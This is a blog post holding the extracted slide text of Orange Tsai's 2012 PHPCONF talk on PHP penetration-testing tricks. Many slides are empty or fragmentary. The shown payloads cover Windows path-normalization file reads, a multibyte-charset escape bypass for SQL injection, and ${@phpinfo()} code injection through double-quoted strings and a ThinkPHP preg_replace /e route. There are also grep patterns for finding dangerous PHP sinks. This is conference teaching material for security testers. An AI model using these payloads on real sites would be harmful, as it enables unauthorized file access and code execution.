---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2012-11-phpconf-2012-security-in-php/
title: "PHPCONF 2012 - Security in PHP 那些在滲透測試的小技巧 | Orange Tsai"
author: "Orange Tsai"
published: 2012-11-02T16:00:00.000Z
description: "在 PHPCONF 2012 的投影片，主要講到三種 trick PHP路徑正規化 Double-Byte Charset 的 Escape Double Quotes 的 Evaluate"
---

* * *

在 PHPCONF 2012 的投影片，主要講到三種 trick

1. PHP路徑正規化
2. Double-Byte Charset 的 Escape
3. Double Quotes 的 Evaluate

Security in PHP 那些在滲透測試的小技巧 - Speaker Deck

[![Avatar for Orange](https://secure.gravatar.com/avatar/5f7ab2ea341a883bf8572190738e864e?s=47)](https://speakerdeck.com/p8361)

[Security in PHP 那些在滲透測試的小技巧](https://speakerdeck.com/p8361/security-in-php-na-xie-zai-shen-tou-ce-shi-de-xiao-ji-qiao)

by [Orange](https://speakerdeck.com/p8361)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](https://speakerdeck.com/)

## Slide 1

### Slide 1 text

2012/11/03 @ PHPCONF




## Slide 2

### Slide 2 text

• aka Orange
• 2009
• 2011
• 2011 AVTOKYO
•
–
– Web Security
– Windows Vulnerability
Exploitation



## Slide 3

### Slide 3 text

• CHROOT Security Group
• NISRA
• case.
• Blog
– http://blog.orange.tw/



## Slide 4

### Slide 4 text

No content


## Slide 5

### Slide 5 text

No content


## Slide 6

### Slide 6 text

No content


## Slide 7

### Slide 7 text

■■



## Slide 8

### Slide 8 text

No content


## Slide 9

### Slide 9 text

## Slide 10

### Slide 10 text

• Low
– Sensitive Information Leakage…
• Middle
– Insecure File Download/Access…
• High
– Local File Inclusion, Code Injection, SQL Inj…



## Slide 11

### Slide 11 text

No content


## Slide 12

### Slide 12 text

•
–
–
–



## Slide 13

### Slide 13 text

• showNews.php?id=198
– showNews.php?id=198/1
• checkName.php?u=lala
– checkName.php?u=lala%cc'
• getFile.php?path=hsu.doc
– getFile.php?path=./hsu.doc
• main.php?module=index
– main.php?module\[\]=index



## Slide 14

### Slide 14 text

No content


## Slide 15

### Slide 15 text

No content


## Slide 16

### Slide 16 text

1\. Router, Controller URL Mapping
2.
3.
4\. DB ORM
PHP orz



## Slide 17

### Slide 17 text

1.
– system exec shell\_exec popen eval
create\_function call\_user\_func preg\_replace…
2.
– \_GET \_POST \_COOKIE \_REQUEST \_ENV \_FILES
\_SERVER HTTP\_RAW\_POST\_DATA php://input
getenv …



## Slide 18

### Slide 18 text

• grep -Re
– (include\|require).+\\$
– (eval\|create\_function\|call\_user\_func\|…).+\\$
– (system\|exec\|shell\_exec\|passthru\|…).+\\$
– (select\|insert\|update\|where\|…).+\\$
– (file\_get\_contents\|readfile\|fopen\|…).+\\$
– (unserialize\|parse\_str\|…).+\\$
– \\$\\$, $a\\(\\)
– ……



## Slide 19

### Slide 19 text

• grep -Re
– \\$(\_GET\|\_POST\|\_COOKIE\|\_REQUEST\|\_FILES)
– \\$(\_ENV\|\_SERVER)
– getenv
– HTTP\_RAW\_POST\_DATA
– php://input
– …



## Slide 20

### Slide 20 text

try {
……
$trans->commit();
} catch (xxx\_adapter\_exception $e) {
$trans->rollback();
require\_once 'xxx\_exceptio$n.class.php'
throw new xxx\_exception( …… );
}



## Slide 21

### Slide 21 text

No content


## Slide 22

### Slide 22 text

No content


## Slide 23

### Slide 23 text

## Slide 24

### Slide 24 text

• down.php?name=
– config.php
– config"php
– config.ph>
– config.<
– c>>>>>"<
– c<"<
Test on PHP 5.4.8
newest stable version
(2012/10/17)
Original Will be replaced by
< \*
\> ?
" .



## Slide 25

### Slide 25 text

No content


## Slide 26

### Slide 26 text

• file\_get\_contents
– \> php\_stream\_open\_wrapper\_ex
– \> zend\_resolve\_path
– \> php\_resolve\_path\_for\_zend
– \> php\_resolve\_path
– \> tsrm\_realpath
– \> virtual\_file\_ex
– \> tsrm\_realpath\_r



## Slide 27

### Slide 27 text

No content


## Slide 28

### Slide 28 text

• file\_get\_contents
• file\_put\_contents
• file
• readfile
• phar\_file\_get\_contents
• include
• include\_once
• require
• require\_once
• fopen
• opendir
• readdir
• mkdir
• ……



## Slide 29

### Slide 29 text

No content


## Slide 30

### Slide 30 text

• config.php/.
• config.php///.
• c>>>>>.


## Slide 31

### Slide 31 text

No content


## Slide 32

### Slide 32 text

• Web Browser PHP Output (HTML)
– Cross-Site Scripting
• DB Management PHP Output (SQL)
– SQL Injection



## Slide 33

### Slide 33 text

SELECT \* FROM \[table\]
WHERE username = 'PHPCONF'



## Slide 34

### Slide 34 text

SELECT \* FROM \[table\]
WHERE username = 'PHPCONF\\''



## Slide 35

### Slide 35 text

SELECT \* FROM \[table\]
WHERE username = 'PHPCONF%cc\\''



## Slide 36

### Slide 36 text

Σ( ° △ °\|\|\|)︴
Before After
PHPCONF PHPCONF
PHPCONF' PHPCONF\\'
PHPCONF%80' PHPCONF�\\'
PHPCONF%cc' PHPCONF岤'
0x81-0xFE
0x40-0x7E 0xA1-0xFE



## Slide 37

### Slide 37 text

• addslashes
• mysql\_escape\_string
• magic\_quote\_gpc
• Special Cases
– pdo
– mysql\_real\_escape\_st
ring



## Slide 38

### Slide 38 text

No content


## Slide 39

### Slide 39 text

• $url = "http://phpconf.tw/2012/";
• $url = "http://phpconf.tw/$year/";
• $url = "http://phpconf.tw/{$year}/";
• $url = "http://phpconf.tw/{${phpinfo()}}/";
• $url = "http://phpconf.tw/${@phpinfo()}/";



## Slide 40

### Slide 40 text

config.php
$dbuser = "root";



## Slide 41

### Slide 41 text

config.php
$dbuser = "${@phpinfo()}";



## Slide 42

### Slide 42 text

$res =
preg\_replace('@(w+)'.$depr.'(\[^'.$depr.'\\/\]+)@e',
'$var\[\\'\\\1\\'\]="\\\2";', implode($depr,$paths));
https://orange.tw/index.php?s=module/action/
param1/${@phpinfo()}



## Slide 43

### Slide 43 text

Think PHP



## Slide 44

### Slide 44 text

No content


## Slide 45

### Slide 45 text

–
–
–
–
–
–



## Slide 46

### Slide 46 text

• PHP Security
– http://blog.php-security.org/
• Oddities of PHP file access in Windows®.
– http://onsec.ru/onsec.whitepaper-02.eng.pdf



## Slide 47

### Slide 47 text

No content